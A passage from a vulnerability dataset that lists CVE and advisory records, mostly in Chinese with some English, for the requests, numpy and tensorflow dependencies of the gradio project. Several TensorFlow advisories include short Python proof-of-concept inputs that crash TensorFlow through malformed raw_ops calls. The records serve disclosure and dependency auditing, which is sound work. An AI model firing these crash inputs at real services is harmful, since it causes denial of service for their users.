- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
gradio-app_gradio,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
gradio-app_gradio,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
gradio-app_gradio,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,tensorflow,,True,,CWE-190,2022-05-26,"### Impact
The implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:

```python
import tensorflow as tf

input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=""SAME"")
```
  
This is another instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).
  
### Patches
We have patched the issue in GitHub commit [3796cc4fcd93ae55812a457abc96dcd55fbb854b](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",3,-2
gradio-app_gradio,tensorflow,,True,CVE-2021-37680,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于在受影响的版本中，TFLite 中全连接层的实现易受零错误除法。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37682,CWE-908,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google Tensorflow 存在代码问题漏洞，该漏洞源于产品使用量化的 TFLite 操作使用了未初始化的值。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37687,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于通过在 indices 中具有负值的模型来从堆中读取任意数据。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37683,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于TFLite 中除法的实现易受 0 错误除法的影响。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37685,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于TensorFlow 可能允许本地经过身份验证的攻击者获取敏感信息，这是由 TFLite 中 expand_dims.cc 中的堆越界读取缺陷引起的。通过发送特制的请求，攻击者可以利用此漏洞读取堆分配数据边界之外的一个元素，并使用此信息对受影响的系统发起进一步攻击。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37689,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于在受影响的版本中，L2NormalizeReduceAxis 运算符的 MLIR 优化存在问题。攻击者可利用该漏洞制作一个 TFLite 模型来触发空指针取消引用，这将导致崩溃和拒绝服务。",2,0
gradio-app_gradio,tensorflow,,True,,CWE-354,2022-02-10,"### Impact
The implementation of [`tf.sparse.split`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_split_op.cc#L26-L102) does not fully validate the input arguments. Hence, a malicious user can trigger a denial of service via a segfault or a heap OOB read:

```python
import tensorflow as tf
data = tf.random.uniform([1, 32, 32], dtype=tf.float32)
axis = [1, 2]
x = tf.sparse.from_dense(data)
result = tf.sparse.split(x,3, axis=axis)
```
The code assumes `axis` is a scalar. This is another instance of [TFSA-2021-190](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-190.md) (CVE-2021-41206).

### Patches
We have patched the issue in GitHub commit [61bf91e768173b001d56923600b40d9a95a04ad5](https://github.com/tensorflow/tensorflow/commit/61bf91e768173b001d56923600b40d9a95a04ad5) (merging [#53695](https://github.com/tensorflow/tensorflow/pull/53695)).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/53660).",2,0
gradio-app_gradio,tensorflow,,True,,CWE-476 CWE-824,2022-02-10,"### Impact 
The [code for boosted trees in TensorFlow](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/boosted_trees/stats_ops.cc) is still missing validation. This allows malicious users to read and write outside of bounds of heap allocated data as well as trigger denial of service (via dereferencing `nullptr`s or via `CHECK`-failures).

This follows after CVE-2021-41208 where these APIs were still vulnerable to multiple security issues.

**Note**: Given that the boosted trees implementation in TensorFlow is unmaintained, it is recommend to no longer use these APIs.  Instead, please use the downstream [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests) project which is newer and supports more features. 
  
These APIs are now deprecated in TensorFlow 2.8. We will remove TensorFlow's boosted trees APIs in subsequent releases.
  
### Patches
We have patched the known issues in multiple GitHub commits.
  
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

This should allow users to use existing boosted trees APIs for a while until they migrate to [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests), while guaranteeing that known vulnerabilities are fixed.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
These vulnerabilities have been reported by Yu Tian of Qihoo 360 AIVul Team and Faysal Hossain Shezan from University of Virginia. Some of the issues have been discovered internally after a careful audit of the APIs.",1,0
gradio-app_gradio,tensorflow,,True,,CWE-190,2022-02-10,"### Impact
The Grappler component of TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) in [constant folding](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L963-L1035):

```cc
  for (const auto& output_prop : output_props) {
    const PartialTensorShape output_shape(output_prop.shape());
    // ...
  }
```
  
The `output_prop` tensor has a shape that is controlled by user input and this can result in triggering one of the `CHECK`s in the `PartialTensorShape` constructor. This is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).

### Patches
We have patched the issue in GitHub commit [be7b286d40bc68cb0b56f702186cc4837d508058](https://github.com/tensorflow/tensorflow/commit/be7b286d40bc68cb0b56f702186cc4837d508058).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",3,0
gradio-app_gradio,tensorflow,,True,,,2022-11-22,"### Impact
Another instance of CVE-2022-35935, where `SobolSample` is vulnerable to a denial of service via assumed scalar inputs, was found and fixed.
```python
import tensorflow as tf
tf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))
```

### Patches
We have patched the issue in GitHub commits [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf) and [02400ea266bd811fc016a848445de1bbff3a23a0](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)

The fix will be included in TensorFlow 2.11. We will also cherrypick both commits on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range. TensorFlow 2.7.4 will have the first commit cherrypicked.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by:
- Kang Hong Jin from Singapore Management University
- Neophytos Christou, Secure Systems Labs, Brown University
- 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
- Pattarakrit Rattankul
",4,-2
gradio-app_gradio,tensorflow,,True,,,2022-11-22,"### Impact
Another instance of CVE-2022-35991, where `TensorListScatter` and `TensorListScatterV2` crash via non scalar inputs in`element_shape`, was found in eager mode and fixed.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
element_shape=arg_2, name=arg_3)
```

### Patches
We have patched the issue in GitHub commit [bf9932fc907aff0e9e8cccf769e8b00d30fd81a1](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul
",4,-2
gradio-app_gradio,tensorflow,,True,CVE-2021-41219,CWE-824 CWE-125,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，稀疏矩阵乘法的代码通过绑定对“nullptr”的引用而容易受到未定义行为的影响。",2,0
gradio-app_gradio,tensorflow,,True,,CWE-400,2022-05-26,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS). The implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:

```python
import tensorflow as tf

input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=""SAME"")
```
  
This is due to an incomplete fix for [CVE-2021-41197](https://security.snyk.io/vuln/?search=CVE-2021-41197).

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.1, 2.7.2, 2.6.4 or higher.
## References
- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b)
- [Tensorflow Advisory](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md)
",2,2
gradio-app_gradio,tensorflow,,True,CVE-2022-35965,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于如果为 LowerBound 或 UpperBound 提供了一个空的 sorted_inputs 输入，它会导致 nullptr 取消引用，从而导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29607,CWE-754,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4版本存在代码问题漏洞，该漏洞源于SparseAdd中不完整的验证会导致攻击者可利用该漏洞利用未定义的行为(对空指针进行解引用)，以及写入堆分配数据的边界之外。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37640,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于tensorflow, tensorflow-cpu, tensorflow-gpu中的除以0错误。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-36000,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 mlir::tfg::ConvertGenericFunctionToFunctionDef 被赋予空函数属性时，它给出一个空解引用。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-29208,CWE-787,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在缓冲区错误漏洞，该漏洞源于tf.raw_ops.EditDistance对于实现的验证不完整。攻击者可以传递负值来利用该漏洞触发基于分段错误的拒绝服务。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23584,CWE-416,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在资源管理错误漏洞，修复将包含在TensorFlow 2.8.0中。我们也会在TensorFlow 2.7.1、TensorFlow 2.6.3和TensorFlow 2.5.3上选择这个提交，因为这些也会受到影响，并且仍然在支持范围内。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2023-25660,CWE-476,2023-03-24,Google TensorFlow 是一套用于机器学习的开源平台。该漏洞源于当 `tf.raw_ops.Print` 的参数 `summarize` 为零时，新方法 `SummarizeArray<bool>` 会引用空指针，导致段错误。,2,2
gradio-app_gradio,tensorflow,,True,CVE-2021-29575,CWE-119 CWE-787,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在缓冲区错误漏洞，该漏洞允许堆栈溢出和/或基于`CHECK`-fail的拒绝服务。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29617,CWE-755,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过利用来自实现CHECK失败来导致拒绝服务。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2022-21738,CWE-190,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于SparseCountSparseOutput的实现可以通过整数溢出使一个TensorFlow进程崩溃，其结果随后被用于内存分配。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29538,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在安全漏洞，攻击者可利用该漏洞可以导致“Conv2DBackpropFilter”中出现除零。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37638,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.6.0 之前版本、2.5.1之前版本、2.4.3之前版本和2.3.4之前版本存在代码问题漏洞，该漏洞源于为`tf.rawu ops.RaggedTensorToTensor`API的`rowu partitionu types`发送无效参数将导致空指针取消引用和未定义的行为",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-21725,CWE-369,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于某些卷积运算的代价估计器可以用来执行一个被0除的运算。函数未能检查stride参数是否严格为正。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41217,CWE-476,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于在受影响的版本中，当应该配对的节点没有时，为 TensorFlow 模型构建控制流图的过程容易受到空指针异常的影响，该问题可能会导致程序崩溃。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37635,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在缓冲区错误漏洞，该漏洞源于软件中的稀疏缩减操作的实现可能会触发堆分配边界之外的数据访问。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35934,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.1、2.8.1和 2.7.2版本存在安全漏洞，该漏洞源于TensorFlow 中 tf.reshape op 的实现很容易受到张量中元素数量溢出影响，导致 CHECK-failure（断言失败），攻击者利用该漏洞可以导致服务拒绝。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35970,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 QuantizedInstanceNorm 被赋予 x_min 或 x_max 非零等级的张量，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23565,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，攻击者可利用该漏洞通过更改磁盘上的 SavedModel 来触发拒绝服务。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-37659,CWE-125 CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，攻击者可以通过在所有不需要广播的二进制""cwise""操作中绑定对空指针的引用来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-21735,CWE-369,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于FractionalMaxPool的实现可以通过除0使TensorFlow进程崩溃。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29530,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在安全漏洞，攻击者可利用该漏洞可以通过向tf.raw_ops.SparseMatrixSparseCholesky提供一个无效的置换来触发空指针解引用。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35989,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 MaxPool 接收到一个窗口大小的输入数组 ksize 的维度大于其输入张量 input 时，GPU 内核会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35996,CWE-369,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于如果 Conv2D 被指定为空 input 并且 filter 和 padding 大小有效，则输出全为零。这会导致除零浮点异常，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29552,CWE-617,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以通过控制num segments张量参数UnsortedSegmentJoin的值来导致拒绝服务。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2022-29198,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.SparseTensorToCSRSparseMatrix 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-41214,CWE-824,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，“tf.ragged.cross”的形状推断代码由于绑定了对“nullptr”的引用而具有未定义的行为。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-35999,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 Conv2DBackpropInput 接收到空的 out_backprop 输入（例如 [3, 1, 0, 1] ）时，当前的 CPU/GPU 内核断言失败（一个带有 dnnl，另一个带有 cudnn）。这可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-41909,CWE-20 CWE-476,2022-11-18,Google TensorFlow 是一套用于机器学习的开源平台。在某些版本（如 2.11、2.10.1 及之前的 2.10.x、2.9.3 及之前的 2.9.x 版本，以及 2.8.4 之前的 2.8.x 版本）中，一个无效的 `CompositeTensorVariant` 张量输入 `encoded` 会导致 `tf.raw_ops.CompositeTensorVariantToComponents` 触发段错误存。这是由于输入的验证不当导致的代码缺陷。,3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-21737,CWE-754,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于*Bincount操作的实现允许恶意用户通过传入会触发CHECK失败的参数来拒绝服务。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-29211,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于tf.histogram_fixed_width值出现非数字元素时应用会发生崩溃。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-36026,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果给 QuantizeAndDequantizeV3 一个非标量 num_bits 输入张量，它会导致断言失败，可以用来触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2022-23563,CWE-367,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于 TensorFlow 使用 tempfile.mktemp 来创建临时文件。虽然这在测试中是可以接受的，但在实用程序和库中这是危险的，因为不同的进程可以在检查 mktemp 中的文件名和通过后续操作实际创建文件之间创建文件（TOC/TOU 类型弱点）。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2022-21740,CWE-787,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于SparseCountSparseOutput的实现容易出现堆溢出。",2,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29592,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞允许传递带有null缓冲区支持的张量一维形状。",3,0
gradio-app_gradio,tensorflow,,True,CVE-2021-29522,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，攻击者可利用该漏洞可以触发一个在tf.raw_ops.Conv3DBackprop*中为0的除法。",4,0
gradio-app_gradio,tensorflow,,True,CVE-2023-25669,CWE-697,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
